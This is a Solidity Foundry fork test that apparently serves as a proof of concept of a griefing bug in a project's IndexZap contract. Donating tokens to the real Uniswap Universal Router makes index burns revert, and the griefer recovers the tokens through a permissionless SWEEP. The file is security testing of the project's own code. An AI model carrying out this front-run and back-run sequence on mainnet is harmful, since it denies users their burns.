// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {stdError} from "forge-std/StdError.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IndexZapForkTest} from "../fork/IndexZap.fork.t.sol";
import {IUniversalRouter} from "../../src/interfaces/IUniversalRouter.sol";
import {ForkAddresses as A} from "../fork/ForkAddresses.sol";

/// @notice PoC against the real Universal Router 2.0.0 (0x66a9...A8Af): a stray/donated balance of a token a burn leg
///         sells, larger than that leg's sale, reverts `burnToToken` with Panic(0x11) (IndexZap.sol:316 / :346), and a
///         griefer who front-runs with the donation and back-runs with a permissionless SWEEP loses nothing but gas.
contract ZapStrayRouterBurnForkPoC is IndexZapForkTest {
    address griefer = makeAddr("griefer");

    function _sweepTo(address token, address to) internal {
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(token, to, uint256(0));
        IUniversalRouter(A.UNIVERSAL_ROUTER).execute(hex"04", inputs); // SWEEP, permissionless
    }

    /// @dev V3 legs, as the app routes WBTC and WETH today.
    function testFork_PoC_strayWethInRouterBlocksV3Burn() public {
        _mint(A.USDC, 1e18, 100);
        assertEq(IERC20(A.WETH).balanceOf(A.UNIVERSAL_ROUTER), 0, "router starts clean");

        deal(A.WETH, griefer, 1 ether);
        vm.prank(griefer);
        IERC20(A.WETH).transfer(A.UNIVERSAL_ROUTER, 1 ether); // front-run

        vm.startPrank(alice);
        index.approve(address(zap), 1e18);
        vm.expectRevert(stdError.arithmeticError);
        _burnCall(index, 1e18, A.USDC, 1, _burnLegs(_burnPaths(A.USDC)));
        vm.stopPrank();
        assertEq(index.balanceOf(alice), 1e18, "the burn did not happen");

        vm.prank(griefer);
        _sweepTo(A.WETH, griefer); // back-run
        assertEq(IERC20(A.WETH).balanceOf(griefer), 1 ether, "griefer recovered the whole donation");

        // With the router clean again the identical burn goes through.
        vm.startPrank(alice);
        uint256 out = _burnCall(index, 1e18, A.USDC, 1, _burnLegs(_burnPaths(A.USDC)));
        vm.stopPrank();
        assertGt(out, 0);
    }

    /// @dev V4 leg (LINK through native ether): `_sellV4` underflows the same way.
    function testFork_PoC_strayLinkInRouterBlocksV4Burn() public {
        _mint(A.USDC, 2e18, 100);
        deal(A.LINK, griefer, 3e18); // the LINK leg sells 2 LINK
        vm.prank(griefer);
        IERC20(A.LINK).transfer(A.UNIVERSAL_ROUTER, 3e18);

        vm.startPrank(alice);
        index.approve(address(zap), 2e18);
        vm.expectRevert(stdError.arithmeticError);
        _burnCall(index, 2e18, A.USDC, 1, _mixedBurnLegs());
        vm.stopPrank();
        assertEq(index.balanceOf(alice), 2e18);
    }

    /// @dev Below the threshold the stray does not revert: it is forwarded to `to` and reported by ComponentReturned
    ///      as if the router had failed to sell it, i.e. the event misattributes a donation as unsold input.
    function testFork_PoC_smallStrayIsReportedAsUnsold() public {
        _mint(A.USDC, 1e18, 100);
        deal(A.WETH, griefer, 1e15);
        vm.prank(griefer);
        IERC20(A.WETH).transfer(A.UNIVERSAL_ROUTER, 1e15); // below the WBTC leg's WETH hop

        uint256 wethBefore = IERC20(A.WETH).balanceOf(alice);
        vm.startPrank(alice);
        index.approve(address(zap), 1e18);
        _burnCall(index, 1e18, A.USDC, 1, _burnLegs(_burnPaths(A.USDC)));
        vm.stopPrank();
        assertEq(IERC20(A.WETH).balanceOf(alice) - wethBefore, 1e15, "the stray reached `to` as 'unsold' WETH");
    }
}
